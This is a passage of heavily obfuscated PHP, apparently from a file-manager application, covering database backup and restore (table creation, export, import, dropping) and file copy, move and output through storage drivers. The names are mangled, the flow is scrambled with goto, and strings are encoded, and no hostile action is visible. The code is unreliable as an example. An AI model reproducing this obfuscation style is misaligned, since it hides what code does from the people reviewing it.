$CßÎ˜Şœ½[970] . $bŞµ¨åñÜÒ; } goto D×ˆç¶ÑòÔ; D×ˆç¶ÑòÔ: $this->database = $D„œºôÀœ; $bïÊÎø­à->execute("\165\163\x65\40\x60{$bŞµ¨åñÜÒ}\140"); return $bïÊÎø­à; goto e‹ãò¼¾ˆ; d˜Ÿ¦ÕÖ©…: $this->database = $D„œºôÀœ; $bïÊÎø­à = $this->model()->db(); try { $bÄæ¢ß†æÕ = $bïÊÎø­à->execute("\163\150\157\167\x20\x64\x61\x74\141\142\x61\x73\x65\x73\x20\x6c\151\153\145\x20\47{$bŞµ¨åñÜÒ}\x27"); } catch (Exception $E»åğ’çÚ) { } goto Ešíƒİ·†µ; DºÔ÷ò³»: $bŞµ¨åñÜÒ = $D„œºôÀœ[$CßÎ˜Şœ½[882]]; $D„œºôÀœ[$CßÎ˜Şœ½[882]] = $CßÎ˜Şœ½[33]; if ($D„œºôÀœ[$CßÎ˜Şœ½[725]] == $CßÎ˜Şœ½[726]) { $cµçìğ¿± = $D„œºôÀœ[$CßÎ˜Şœ½[727]]; $D„œºôÀœ[$CßÎ˜Şœ½[727]] = substr($cµçìğ¿±, 0, strrpos($cµçìğ¿±, $CßÎ˜Şœ½[970])); } goto d˜Ÿ¦ÕÖ©…; e‹ãò¼¾ˆ: } public function createTable($Dêçõ…ÆÛÓ, $DÛ¤êá‘â– = null) { $fŠõ°å…³Â =& $_SERVER[Å¸ş]; if (!IO::exist($Dêçõ…ÆÛÓ)) { ActionCall($fŠõ°å…³Â[971], !0, 0); show_json(LNG($fŠõ°å…³Â[972]), !1); } $B‹…òóœ×× = sqlSplit(IO::getContent($Dêçõ…ÆÛÓ)); foreach ($B‹…òóœ×× as $A£Ø·³¡Áæ) { if ($DÛ¤êá‘â–) { $f‡óÓĞ‚øñ = stripos($A£Ø·³¡Áæ, $fŠõ°å…³Â[973]) === 0; if ($f‡óÓĞ‚øñ) { $DÛ¤êá‘â–->task[$fŠõ°å…³Â[974]] += 1; } } $this->model()->db()->execute($A£Ø·³¡Áæ); if ($DÛ¤êá‘â– && $f‡óÓĞ‚øñ) { preg_match($fŠõ°å…³Â[975], $A£Ø·³¡Áæ, $c…Ø¶è©‰); $DÛ¤êá‘â–->task[$fŠõ°å…³Â[976]] = $c…Ø¶è©‰[1]; $DÛ¤êá‘â–->update(1); } } $this->taskToCache($DÛ¤êá‘â–); } public function insertTable($EË”·ÊãÃ, $D°§Ëçªõ = null) { $aŒé«½Èá‘ =& $_SERVER[Å¸ş]; $CÄª…ç¡Ç = $this->model()->db(); $BºªÆ„ÉÑ = $B´º‰ƒ“¨Ô ? array($B´º‰ƒ“¨Ô) : $CÄª…ç¡Ç->getTables(); foreach ($EË”·ÊãÃ as $f´›öõ«¶) { $B´º‰ƒ“¨Ô = basename($f´›öõ«¶, $aŒé«½Èá‘[720]); if (!in_array($B´º‰ƒ“¨Ô, $BºªÆ„ÉÑ)) { continue; } if ($D°§Ëçªõ) { $D°§Ëçªõ->task[$aŒé«½Èá‘[976]] = $B´º‰ƒ“¨Ô; } if (get_filesize($f´›öõ«¶) == 0) { continue; } $c°³Ñ‰øÚ‡ = $this->sqlToDb($f´›öõ«¶, $D°§Ëçªõ); if (!$c°³Ñ‰øÚ‡) { ActionCall($aŒé«½Èá‘[971], !0, 0); show_json(LNG($aŒé«½Èá‘[977]) . "\133{$B´º‰ƒ“¨Ô}\x5d", !1); } } $this->taskToCache($D°§Ëçªõ); } public function sqlFromDb($d¥ÂÚ„¨¸, $dæ¬Êõ„Ñà, $DÒÒäì®˜¦ = null, $d¤¯õ´˜ñˆ = null) { goto c…½ñÊÎñ; c÷÷ğÅØÆ: $EÊéÈ¾º´ = $BæùŞÈáö•->getPk(); $C‡¦Ä«ÙÔÜ = $BæùŞÈáö•->getDbFields(); do { $f‰§°²¢Ä = $BæùŞÈáö•->field($C‡¦Ä«ÙÔÜ)->order($EÊéÈ¾º´ . $_SERVER[Å¸ş][979])->selectPage($föÆƒÕÁÚ, $eŸİæ²ƒ½‰); $C½‚á© ²Å = isset($f‰§°²¢Ä[$_SERVER[Å¸ş][351]][$_SERVER[Å¸ş][353]]) ? $f‰§°²¢Ä[$_SERVER[Å¸ş][351]][$_SERVER[Å¸ş][353]] : 0; $A‡ê†ÌéÁÀ = !empty($f‰§°²¢Ä[$_SERVER[Å¸ş][354]]) ? $f‰§°²¢Ä[$_SERVER[Å¸ş][354]] : array(); if (!($CéÕ°ƒÏ¬î = count($A‡ê†ÌéÁÀ))) { break; } $D…ñËšêÃ² = array(); foreach ($A‡ê†ÌéÁÀ as $A¨—ŠÄóæÃ) { if ($d¥ÂÚ„¨¸ == $_SERVER[Å¸ş][980] && $A¨—ŠÄóæÃ[$_SERVER[Å¸ş][29]] == $_SERVER[Å¸ş][981]) { $bÒ¯²¢¼…ô = json_decode($A¨—ŠÄóæÃ[$_SERVER[Å¸ş][359]], !0); if ($bÒ¯²¢¼…ô[$_SERVER[Å¸ş][28]] == date($_SERVER[Å¸ş][693]) && !$bÒ¯²¢¼…ô[$_SERVER[Å¸ş][692]]) { continue; } } if ($d¤¯õ´˜ñˆ) { $A¨—ŠÄóæÃ[$_SERVER[Å¸ş][75]] = "\x7b\151\x6f\x3a{$d¤¯õ´˜ñˆ}\175" . substr($A¨—ŠÄóæÃ[$_SERVER[Å¸ş][75]], strlen("\173\x69\x6f\72{$A¨—ŠÄóæÃ[$_SERVER[Å¸ş][746]]}\x7d")); $A¨—ŠÄóæÃ[$_SERVER[Å¸ş][746]] = $d¤¯õ´˜ñˆ; } $D…ñËšêÃ²[] = $_SERVER[Å¸ş][982] . $this->sqlEncode($A¨—ŠÄóæÃ) . $_SERVER[Å¸ş][983]; } $bˆóÇƒ£ëº = "\x49\x4e\123\x45\x52\x54\40\111\116\x54\117\40\x60{$d¥ÂÚ„¨¸}\140\40\50\140" . implode($_SERVER[Å¸ş][984], $C‡¦Ä«ÙÔÜ) . $_SERVER[Å¸ş][985]; fwrite($CØ‘¿²Úƒ, $bˆóÇƒ£ëº . implode($_SERVER[Å¸ş][986], $D…ñËšêÃ²) . $_SERVER[Å¸ş][67] . PHP_EOL); $eŸİæ²ƒ½‰++; $FŞ«õ°Œ += $CéÕ°ƒÏ¬î; if ($DÒÒäì®˜¦) { $DÒÒäì®˜¦->update($CéÕ°ƒÏ¬î); } } while ($eŸİæ²ƒ½‰ <= $C½‚á© ²Å); goto cÄ÷…Ú‚ÜÄ; cÄ÷…Ú‚ÜÄ: fclose($CØ‘¿²Úƒ); return $FŞ«õ°Œ; goto eˆœ…Ì“ËĞ; e—Ë‘ˆİ÷¤: $eŸİæ²ƒ½‰ = 1; $föÆƒÕÁÚ = 500; $CØ‘¿²Úƒ = fopen($dæ¬Êõ„Ñà, $_SERVER[Å¸ş][978]); goto c÷÷ğÅØÆ; c…½ñÊÎñ: if ($DÒÒäì®˜¦) { $DÒÒäì®˜¦->task[$_SERVER[Å¸ş][976]] = $d¥ÂÚ„¨¸; } $BæùŞÈáö• = $this->model($d¥ÂÚ„¨¸); $FŞ«õ°Œ = 0; goto e—Ë‘ˆİ÷¤; eˆœ…Ì“ËĞ: } public function sqlToDb($Bó˜‰Ãª, $cø•¦áƒÈ… = null) { goto aƒ¸•–ƒÔÍ; aƒ¸•–ƒÔÍ: $Fğùå’–Ñê =& $_SERVER[Å¸ş]; $c†‹‰ğ°Ö = $this->model()->db(); $CÑëƒ¨¨Ô¥ = @fopen($Bó˜‰Ãª, $Fğùå’–Ñê[987]); goto Cà³„Ÿøö; Cà³„Ÿøö: if (!$CÑëƒ¨¨Ô¥) { return !1; } $Cé‹»æÙí‰ = 0; $F¬ù’èñå = $Fğùå’–Ñê[33]; goto FŞ¹†ê·ŞÈ; d”‘ğŞƒ’‚: if (trim($F¬ù’èñå)) { $F¬ù’èñå = rtrim(trim($F¬ù’èñå), $Fğùå’–Ñê[67]); if (!$c†‹‰ğ°Ö->execute($F¬ù’èñå)) { return !1; } if ($cø•¦áƒÈ…) { $cø•¦áƒÈ…->update($Cé‹»æÙí‰ - 1); } } return !0; goto B›ÀÁí½; FŞ¹†ê·ŞÈ: $b¢•ì¡êÇ£ = 500 + 1; while (!feof($CÑëƒ¨¨Ô¥)) { if ($cø•¦áƒÈ… && $Cé‹»æÙí‰ != 0) { $cø•¦áƒÈ…->task[$Fğùå’–Ñê[974]] += 1; } $Cé‹»æÙí‰++; $eë®¿Î‹Á = trim(fgets($CÑëƒ¨¨Ô¥)); $F¬ù’èñå .= $Fğùå’–Ñê[50] . $this->sqlDecode($eë®¿Î‹Á, $this->type); if ($Cé‹»æÙí‰ == $b¢•ì¡êÇ£) { $F¬ù’èñå = rtrim(trim($F¬ù’èñå), $Fğùå’–Ñê[67]); if (!$c†‹‰ğ°Ö->execute($F¬ù’èñå)) { return !1; } if ($cø•¦áƒÈ…) { $cø•¦áƒÈ…->update($Cé‹»æÙí‰ - 1); } $F¬ù’èñå = $Fğùå’–Ñê[33]; $Cé‹»æÙí‰ = 0; } } fclose($CÑëƒ¨¨Ô¥); goto d”‘ğŞƒ’‚; B›ÀÁí½: } public function dropTable($C¯‘¶‚ÏÔâ = null) { $a—ËÅîöê = $this->model()->db(); $EÒ¤§’Åõ© = $C¯‘¶‚ÏÔâ ? array($C¯‘¶‚ÏÔâ) : $a—ËÅîöê->getTables(); if (!$EÒ¤§’Åõ©) { return; } foreach ($EÒ¤§’Åõ© as $C¯‘¶‚ÏÔâ) { $a—ËÅîöê->execute("\144\x72\157\160\40\164\x61\142\x6c\x65\40\151\146\40\145\x78\151\163\x74\163\x20\x60{$C¯‘¶‚ÏÔâ}\x60"); } } private function taskToCache($F´–ÜáØÇ = null) { $Bİ’‰ôßÍ± =& $_SERVER[Å¸ş]; if (!$F´–ÜáØÇ) { return; } $C±â¬ä­½Š = array($Bİ’‰ôßÍ±[976] => $F´–ÜáØÇ->task[$Bİ’‰ôßÍ±[976]], $Bİ’‰ôßÍ±[974] => $F´–ÜáØÇ->task[$Bİ’‰ôßÍ±[974]], $Bİ’‰ôßÍ±[988] => $F´–ÜáØÇ->task[$Bİ’‰ôßÍ±[988]]); if ($C±â¬ä­½Š[$Bİ’‰ôßÍ±[974]] == $C±â¬ä­½Š[$Bİ’‰ôßÍ±[988]]) { $C±â¬ä­½Š[$Bİ’‰ôßÍ±[699]] = 1; } Cache::set($Bİ’‰ôßÍ±[989] . $F´–ÜáØÇ->task[$Bİ’‰ôßÍ±[367]], $C±â¬ä­½Š); $F´–ÜáØÇ->end(); } private function sqlEncode($cÀÖªª‚¯©) { $A·´ÖÍæÒ =& $_SERVER[Å¸ş]; $bÅ¾áË¬”Ë = array(); foreach ($cÀÖªª‚¯© as $E‚ƒğ–Ûãª) { if (is_array($E‚ƒğ–Ûãª)) { $E‚ƒğ–Ûãª = json_encode_force($E‚ƒğ–Ûãª); } $E‚ƒğ–Ûãª = addslashes($E‚ƒğ–Ûãª); $E‚ƒğ–Ûãª = str_replace(array($A·´ÖÍæÒ[990], $A·´ÖÍæÒ[217]), array($A·´ÖÍæÒ[991], $A·´ÖÍæÒ[992]), $E‚ƒğ–Ûãª); $bÅ¾áË¬”Ë[] = str_replace($A·´ÖÍæÒ[55], $A·´ÖÍæÒ[993], $E‚ƒğ–Ûãª); } return $A·´ÖÍæÒ[55] . implode($A·´ÖÍæÒ[994], $bÅ¾áË¬”Ë) . $A·´ÖÍæÒ[55]; } private function sqlDecode($d§½‹¼„‰, $eö›˜Ëàï›) { $dÇ—Â“¦ëÊ =& $_SERVER[Å¸ş]; $d§½‹¼„‰ = str_replace(array($dÇ—Â“¦ëÊ[991], $dÇ—Â“¦ëÊ[992]), array($dÇ—Â“¦ëÊ[990], $dÇ—Â“¦ëÊ[217]), $d§½‹¼„‰); if ($eö›˜Ëàï› == $dÇ—Â“¦ëÊ[9]) { $d§½‹¼„‰ = stripslashes($d§½‹¼„‰); } return $d§½‹¼„‰; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($DåÍî‡ù§´, $a¥ÖØèÔÊ˜) { $B…¬ƒ½Œ©… = self::driverMake($a¥ÖØèÔÊ˜[0]); if (method_exists($B…¬ƒ½Œ©…, $DåÍî‡ù§´)) { return @call_user_func_array(array($B…¬ƒ½Œ©…, $DåÍî‡ù§´), $a¥ÖØèÔÊ˜); } if (method_exists($B…¬ƒ½Œ©…, $_SERVER[Å¸ş][995])) { return @call_user_func_array(array($B…¬ƒ½Œ©…, $DåÍî‡ù§´), $a¥ÖØèÔÊ˜); } else { if (method_exists(self, $DåÍî‡ù§´)) { return @call_user_func_array(array(self, $DåÍî‡ù§´), $a¥ÖØèÔÊ˜); } else { call_user_func_array(array(parent, $DåÍî‡ù§´), $a¥ÖØèÔÊ˜); } } } public static function init($cê…ù¶ÆÉÑ) { return self::driverMake($cê…ù¶ÆÉÑ); } public static function copy($e˜ô‘¥Ùòƒ, $Eâ—ˆ“’Ê, $cšøˆéøËš = false, $eˆ¹÷è×æ† = false) { return self::copyMove($e˜ô‘¥Ùòƒ, $Eâ—ˆ“’Ê, $cšøˆéøËš, $_SERVER[Å¸ş][492], $eˆ¹÷è×æ†); } public static function move($fø®‰×Ú¨œ, $CÌˆÅØâİ, $c‰‘Ê¢Å±¤ = false, $FÏˆ·ä™¹ = false) { return self::copyMove($fø®‰×Ú¨œ, $CÌˆÅØâİ, $c‰‘Ê¢Å±¤, $_SERVER[Å¸ş][494], $FÏˆ·ä™¹); } public static function saveFile($d˜ÀÛğò¿ø, $ağ’Üã¾ó•, $cç³àÂïºé = true) { goto dğ´ ŒÖˆ; AÏ¨ŠêËÂ¦: $Fˆ‡Ş³ = $Eøˆñ†µÏ->pathFather($ağ’Üã¾ó•); $EŸˆ—«öÍ = !0; if (!$cç³àÂïºé && self::driverIsSame($cÀ•Ó¬™, $Eøˆñ†µÏ)) { $EŸˆ—«öÍ = !1; } goto bĞŸ²¦Ö·­; E «Ã¤†ˆ: $Eøˆñ†µÏ = self::driverMake($ağ’Üã¾ó•); $B—¤Ô­ÙŒ» = !1; if ($Eøˆñ†µÏ->pathParse[$eìÛé™“å[996]]) { $F›¡£À¥Ò = $Eøˆñ†µÏ->pathParse[$eìÛé™“å[996]]; $B—¤Ô­ÙŒ» = $Eøˆñ†µÏ; $Eøˆñ†µÏ = self::driverMake($F›¡£À¥Ò); } goto AÏ¨ŠêËÂ¦; dğ´ ŒÖˆ: $eìÛé™“å =& $_SERVER[Å¸ş]; $e³ï›ïÏ°› = self::info($ağ’Üã¾ó•); $cÀ•Ó¬™ = self::driverMake($d˜ÀÛğò¿ø); goto E «Ã¤†ˆ; bĞŸ²¦Ö·­: $F„Ö‹Š˜äŞ = self::copyFile($cÀ•Ó¬™, $d˜ÀÛğò¿ø, $Eøˆñ†µÏ, $Fˆ‡Ş³, $e³ï›ïÏ°›[$eìÛé™“å[28]], $EŸˆ—«öÍ); if ($B—¤Ô­ÙŒ») { $F„Ö‹Š˜äŞ = $B—¤Ô­ÙŒ»->getPathOuter($F„Ö‹Š˜äŞ); } return $F„Ö‹Š˜äŞ; goto CšÒì†ÈæÃ; CšÒì†ÈæÃ: } private static function copyMove($F’Şğíœ÷á, $e×¡£¿µ…ï, $CÔñÜñ»ö, $BÂõ‡š¸İÓ, $fç›§İ°Èí = false) { goto aàù¦ŸìÂÊ; b™¾¥¦‡´å: $E‰ïóñÃĞÎ = self::driverMake($F’Şğíœ÷á); $Dö½îöÕëó = self::driverMake($e×¡£¿µ…ï); $F‰¹Œô‹æ¹ = $BÂõ‡š¸İÓ == $f÷¢‘³…¬[494]; goto bÍªÔÍ‡»; aàù¦ŸìÂÊ: $f÷¢‘³…¬ =& $_SERVER[Å¸ş]; if (!$F’Şğíœ÷á || $F’Şğíœ÷á == $f÷¢‘³…¬[8] || !$e×¡£¿µ…ï) { return !1; } ignore_timeout(); goto b™¾¥¦‡´å; aêãª¸ƒá: if ($fù¤Š ­„) { $B§¿Éƒ“ = $fù¤Š ­„->getPathOuter($B§¿Éƒ“); } return $B§¿Éƒ“; goto D³íÚò„µ÷; AÀÌìëòĞ: Hook::trigger($f÷¢‘³…¬[72], $E‰ïóñÃĞÎ, $F’Şğíœ÷á, $Dö½îöÕëó, $e×¡£¿µ…ï); $BÈ¯öğË ¨ = self::driverIsSame($E‰ïóñÃĞÎ, $Dö½îöÕëó); if ($BÈ¯öğË ¨) { if ($BÂõ‡š¸İÓ == $f÷¢‘³…¬[494] && !method_exists($Dö½îöÕëó, $f÷¢‘³…¬[997]) && trim($e×¡£¿µ…ï, $f÷¢‘³…¬[8]) == trim($Dö½îöÕëó->pathFather($F’Şğíœ÷á), $f÷¢‘³…¬[8])) { return $Dö½îöÕëó->getPathOuter($F’Şğíœ÷á); } if (method_exists($Dö½îöÕëó, $BÂõ‡š¸İÓ)) { return $Dö½îöÕëó->{$BÂõ‡š¸İÓ}($F’Şğíœ÷á, $e×¡£¿µ…ï, $CÔñÜñ»ö); } } goto b‡ß’±öˆ; bÍªÔÍ‡»: $fù¤Š ­„ = !1; if ($Dö½îöÕëó->pathParse[$f÷¢‘³…¬[996]]) { $e×¡£¿µ…ï = $Dö½îöÕëó->pathParse[$f÷¢‘³…¬[996]]; $fù¤Š ­„ = $Dö½îöÕëó; $Dö½îöÕëó = self::driverMake($e×¡£¿µ…ï); } self::check($E‰ïóñÃĞÎ, $F’Şğíœ÷á, $Dö½îöÕëó, $e×¡£¿µ…ï); goto AÀÌìëòĞ; b‡ß’±öˆ: $aËÜ‘í‰ò = $E‰ïóñÃĞÎ->isFile($F’Şğíœ÷á); if (!$aËÜ‘í‰ò && $Dö½îöÕëó->getType() == $f÷¢‘³…¬[697] && $E‰ïóñÃĞÎ->getType() == $f÷¢‘³…¬[102]) { $B§¿Éƒ“ = $Dö½îöÕëó->copyFolderFromIO($E‰ïóñÃĞÎ, $F’Şğíœ÷á, $e×¡£¿µ…ï, $CÔñÜñ»ö, $F‰¹Œô‹æ¹, $fç›§İ°Èí); } else { $B§¿Éƒ“ = self::copyPath($E‰ïóñÃĞÎ, $F’Şğíœ÷á, $Dö½îöÕëó, $e×¡£¿µ…ï, $CÔñÜñ»ö, $F‰¹Œô‹æ¹, $aËÜ‘í‰ò, $fç›§İ°Èí); } if ($B§¿Éƒ“ && $F‰¹Œô‹æ¹) { $E‰ïóñÃĞÎ->remove($F’Şğíœ÷á); } goto aêãª¸ƒá; D³íÚò„µ÷: } private static function check($fÕÈÜöçÔë, $f‹òŠÑí­ª, $d·ÆŒˆÌñª, &$a”«¦¡â) { $Dğ™ô•·ø‹ =& $_SERVER[Å¸ş]; if (self::driverIsSame($fÕÈÜöçÔë, $d·ÆŒˆÌñª) && $fÕÈÜöçÔë->isFolder($f‹òŠÑí­ª) && $fÕÈÜöçÔë->isParentOf($f‹òŠÑí­ª, $a”«¦¡â)) { show_json(LNG($Dğ™ô•·ø‹[998]), !1); } if (!$fÕÈÜöçÔë->exist($f‹òŠÑí­ª)) { show_json(LNG($Dğ™ô•·ø‹[101]), !1); } } private static function copyPath($bè¤Ê‹Ë°è, $Bàöœ¯Ì–, $c¡àµ¦»ÍÁ, $cª„ˆ¹ŠÍĞ, $FÛŒÊÄŒ‹­, $A˜ÈÄ¨²ñ, $e‹½çÍ¹›¾, $a”äÈ§ÂÇÚ = false) { goto CŠŠÜ­ ö; e±Ü²“Êƒƒ: $C‰¶¦Øó«× = $c¡àµ¦»ÍÁ->mkdir($c¡àµ¦»ÍÁ->getPath($cáÉ®ÂèØƒ)); $cª„ˆ¹ŠÍĞ = $c¡àµ¦»ÍÁ->getPathInner($C‰¶¦Øó«×); $E¨‚¹µÈæ = $bè¤Ê‹Ë°è->listPath($Bàöœ¯Ì–, !0); goto Aø¢çè÷µ; CŠŠÜ­ ö: $A¹ÄÄ¯…¦› =& $_SERVER[Å¸ş]; $FÒ‰ÃÑ×ºç = $a”äÈ§ÂÇÚ ? $a”äÈ§ÂÇÚ : $bè¤Ê‹Ë°è->getPathName($bè¤Ê‹Ë°è->pathThis($Bàöœ¯Ì–)); if ($FÛŒÊÄŒ‹­) { $Fôôä®Ã¬ = $c¡àµ¦»ÍÁ->fileNameExist($cª„ˆ¹ŠÍĞ, $FÒ‰ÃÑ×ºç); $FÒ‰ÃÑ×ºç = $c¡àµ¦»ÍÁ->fileNameAuto($cª„ˆ¹ŠÍĞ, $FÒ‰ÃÑ×ºç, $FÛŒÊÄŒ‹­, !$e‹½çÍ¹›¾); $FÛŒÊÄŒ‹­ = $Fôôä®Ã¬ ? $FÛŒÊÄŒ‹­ : !1; } goto CŠùÈ´ß¦¥; CŠùÈ´ß¦¥: if ($e‹½çÍ¹›¾) { return self::copyFile($bè¤Ê‹Ë°è, $Bàöœ¯Ì–, $c¡àµ¦»ÍÁ, $cª„ˆ¹ŠÍĞ, $FÒ‰ÃÑ×ºç, $A˜ÈÄ¨²ñ); } if ($FÛŒÊÄŒ‹­ == REPEAT_RENAME_FOLDER) { $FÛŒÊÄŒ‹­ = !1; } $cáÉ®ÂèØƒ = rtrim($cª„ˆ¹ŠÍĞ, $A¹ÄÄ¯…¦›[8]) . $A¹ÄÄ¯…¦›[8] . $FÒ‰ÃÑ×ºç; goto e±Ü²“Êƒƒ; Aø¢çè÷µ: $D»èÔæ¼ÌÙ = array_merge($E¨‚¹µÈæ[$A¹ÄÄ¯…¦›[73]], $E¨‚¹µÈæ[$A¹ÄÄ¯…¦›[74]]); foreach ($D»èÔæ¼ÌÙ as $a¤”æ‘ÒœÜ) { $fÕá½ÒÖãˆ = $a¤”æ‘ÒœÜ[$A¹ÄÄ¯…¦›[29]] == $A¹ÄÄ¯…¦›[167]; $Bàöœ¯Ì– = $bè¤Ê‹Ë°è->getPathInner($a¤”æ‘ÒœÜ[$A¹ÄÄ¯…¦›[75]]); $c ‘¼É‡­† = self::copyPath($bè¤Ê‹Ë°è, $Bàöœ¯Ì–, $c¡àµ¦»ÍÁ, $cª„ˆ¹ŠÍĞ, $FÛŒÊÄŒ‹­, $A˜ÈÄ¨²ñ, $fÕá½ÒÖãˆ); if (!$c ‘¼É‡­†) { write_log($A¹ÄÄ¯…¦›[999] . $Bàöœ¯Ì– . $A¹ÄÄ¯…¦›[1000] . $cª„ˆ¹ŠÍĞ, $A¹ÄÄ¯…¦›[1001]); } } return $C‰¶¦Øó«×; goto e™÷Œ¦‹Š; e™÷Œ¦‹Š: } private static function copyFile($eÍ»œËñ…Ÿ, $fµÀÄå¸Ò, $F¸»¦ïÎ, $dñùÔÒÏ”–, $c½µÜŒƒÉÓ, $b‘©óÁØ°) { goto FÆ—Š‡¾ïˆ; c‘×Ù¨ğ: $e©£µÒô½ = $eÍ»œËñ…Ÿ->iconvApp($e©£µÒô½); $c‚å•è¬— = $F¸»¦ïÎ->upload($dñùÔÒÏ”–, $e©£µÒô½, $b‘©óÁØ°); self::remove($AÜ‰‰«õ—ª . $F›÷„Ä¯å´); goto eÑšï‡ø×‰; f¢ºé¹Ä£ç: Hook::trigger($f¹­Ãƒƒ’[1003], $eÍ»œËñ…Ÿ, $fµÀÄå¸Ò, $F¸»¦ïÎ, $dñùÔÒÏ”–, $c½µÜŒƒÉÓ, $F›÷„Ä¯å´); if (self::driverIsSame($eÍ»œËñ…Ÿ, $F¸»¦ïÎ)) { if ($b‘©óÁØ°) { $c‚å•è¬— = $F¸»¦ïÎ->moveFile($fµÀÄå¸Ò, $dñùÔÒÏ”–); } else { $c‚å•è¬— = $F¸»¦ïÎ->copyFile($fµÀÄå¸Ò, $dñùÔÒÏ”–); } Hook::trigger($f¹­Ãƒƒ’[1004], $eÍ»œËñ…Ÿ, $fµÀÄå¸Ò, $F¸»¦ïÎ, $dñùÔÒÏ”–, $c½µÜŒƒÉÓ, $c‚å•è¬—); return $c‚å•è¬—; } $AÜ‰‰«õ—ª = TEMP_FILES; goto eÚ‹‘Ü —Ç; FÆ—Š‡¾ïˆ: $f¹­Ãƒƒ’ =& $_SERVER[Å¸ş]; $dñùÔÒÏ”– = $F¸»¦ïÎ->getPath(rtrim($dñùÔÒÏ”–, $f¹­Ãƒƒ’[8]) . $f¹­Ãƒƒ’[8] . $c½µÜŒƒÉÓ); $F›÷„Ä¯å´ = $f¹­Ãƒƒ’[1002] . time() . rand_string(5); goto f¢ºé¹Ä£ç; eÚ‹‘Ü —Ç: mk_dir($AÜ‰‰«õ—ª); $e©£µÒô½ = $AÜ‰‰«õ—ª . $F›÷„Ä¯å´; $e©£µÒô½ = $eÍ»œËñ…Ÿ->download($fµÀÄå¸Ò, $e©£µÒô½); goto c‘×Ù¨ğ; eÑšï‡ø×‰: Hook::trigger($f¹­Ãƒƒ’[1004], $eÍ»œËñ…Ÿ, $fµÀÄå¸Ò, $F¸»¦ïÎ, $dñùÔÒÏ”–, $c½µÜŒƒÉÓ, $c‚å•è¬—); return $c‚å•è¬—; goto a—í•åÛ…î; a—í•åÛ…î: } public static function pathFather($C¼ğç……¯ğ) { $DˆöË¢âô = IO::init($C¼ğç……¯ğ); $Eàš±Ö±áî = $DˆöË¢âô->pathFather($DˆöË¢âô->path); return $DˆöË¢âô->getPathOuter($Eàš±Ö±áî); } public static function fileOut($cæ„°“±àê, $FÃèµë§Ú· = false, $E„öóŒÇë = false, $cĞ÷§„œâ = '') { $B¡¬ˆ…‹Ş× = self::driverMake($cæ„°“±àê); if ($B¡¬ˆ…‹Ş×->isFileOutServer()) { return $B¡¬ˆ…‹Ş×->fileOutServer($cæ„°“±àê, $FÃèµë§Ú·, $E„öóŒÇë, $cĞ÷§„œâ); } return $B¡¬ˆ…‹Ş×->fileOut($cæ„°“±àê, $FÃèµë§Ú·, $E„öóŒÇë, $cĞ÷§„œâ); } public static function fileOutImage($f¾««ÙŒ£­, $F…à‚ì†ˆµ = 250) { $FæÈ¿Îç¡ = array(250, 600, 1200, 3000); for ($aØµ¥ñêºÖ = 0; $aØµ¥ñêºÖ < count($FæÈ¿Îç¡); $aØµ¥ñêºÖ++) { if ($aØµ¥ñêºÖ == 0 && $F…à‚ì†ˆµ <= $FæÈ¿Îç¡[$aØµ¥ñêºÖ]) { $F…à‚ì†ˆµ = $FæÈ¿Îç¡[$aØµ¥ñêºÖ]; break; } else { if ($F…à‚ì†ˆµ > $FæÈ¿Îç¡[$aØµ¥ñêºÖ - 1] && $F…à‚ì†ˆµ <= $FæÈ¿Îç¡[$aØµ¥ñêºÖ]) { $F…à‚ì†ˆµ = $FæÈ¿Îç¡[$aØµ¥ñêºÖ]; break; } else { if ($aØµ¥ñêºÖ == count($FæÈ¿Îç¡) - 1 && $F…à‚ì†ˆµ > $FæÈ¿Îç¡[$aØµ¥ñêºÖ]) { $F…à‚ì†ˆµ = $FæÈ¿Îç¡[$aØµ¥ñêºÖ]; break; } } } } $eƒºç“–è² = self::driverMake($f¾««ÙŒ£­); if ($eƒºç“–è²->isFileOutServer()) { return $eƒºç“–è²->fileOutImageServer($f¾««ÙŒ£­, $F…à‚ì†ˆµ); } return $eƒºç“–è²->fileOutImage($f¾««ÙŒ£­, $F…à‚ì†ˆµ); } private static function driverIsSame($Fç“†’Çˆ‚, $A’Ù¼¥Ëù) { goto fç’ÏÂÕğÆ; fç’ÏÂÕğÆ: $CŸåÑ‚´¦• =& $_SERVER[Å¸ş]; $a‚‡ƒ†Şå = $Fç“†’Çˆ‚->getType(); $Cõ¼ÄÍ‡— = $A’Ù¼¥Ëù->getType(); goto FŞñŒñšª®; A÷Ä‚· : if ($Fç“†’Çˆ‚->pathDriver == $A’Ù¼¥Ëù->pathDriver) { return !0; } return !1; goto C†ˆÎø‚ãî; FŞñŒñšª®: if ($a‚‡ƒ†Şå != $Cõ¼ÄÍ‡—) { return !1; } if ($a‚‡ƒ†Şå == $CŸåÑ‚´¦•[697]) { return !0; } if ($a‚‡ƒ†Şå == $CŸåÑ‚´¦•[102]) { return !0; } goto A÷Ä‚· ; C†ˆÎø‚ãî: } public static function copyUpdate($F¨±øß¥Š, $b•èĞìŞï) { goto cãäè‹ğÌŞ; cãäè‹ğÌŞ: $B’ÈéÅ«Äİ =& $_SERVER[Å¸ş]; if (!IO::exist($F¨±øß¥Š)) { return !1; } if (!IO::exist($b•èĞìŞï)) { IO::mkdir($b•èĞìŞï); } goto fğ¸¼Á²¡¶; Bğ›„—÷ˆø: $A³ö‘À²÷ = array(); foreach ($D“‚ óÏñÕ as $a·öºÂƒÖ => $eÚÉ¹ÇŒç) { if (isset($F¥ÆÄ…Œ½[$a·öºÂƒÖ])) { if ($eÚÉ¹ÇŒç[$B’ÈéÅ«Äİ[76]] == 1) { continue; } if ($F¥ÆÄ…Œ½[$a·öºÂƒÖ][$B’ÈéÅ«Äİ[77]] == $eÚÉ¹ÇŒç[$B’ÈéÅ«Äİ[77]]) { continue; } } if ($eÚÉ¹ÇŒç[$B’ÈéÅ«Äİ[76]] == 1) { $A³ö‘À²÷[] = $b•èĞìŞï . $B’ÈéÅ«Äİ[8] . $a·öºÂƒÖ; continue; } $A˜À­¨ˆ• = strstr(trim($a·öºÂƒÖ, $B’ÈéÅ«Äİ[8]), $B’ÈéÅ«Äİ[8]) ? get_path_father($a·öºÂƒÖ) : $B’ÈéÅ«Äİ[33]; $Aä®µÊõ¡[] = array($B’ÈéÅ«Äİ[1005] => $eÚÉ¹ÇŒç[$B’ÈéÅ«Äİ[75]], $B’ÈéÅ«Äİ[1006] => rtrim($b•èĞìŞï, $B’ÈéÅ«Äİ[8]) . $B’ÈéÅ«Äİ[8] . $A˜À­¨ˆ•, $B’ÈéÅ«Äİ[1007] => $eÚÉ¹ÇŒç); } $D¹ò—ñÃ = array($B’ÈéÅ«Äİ[167] => 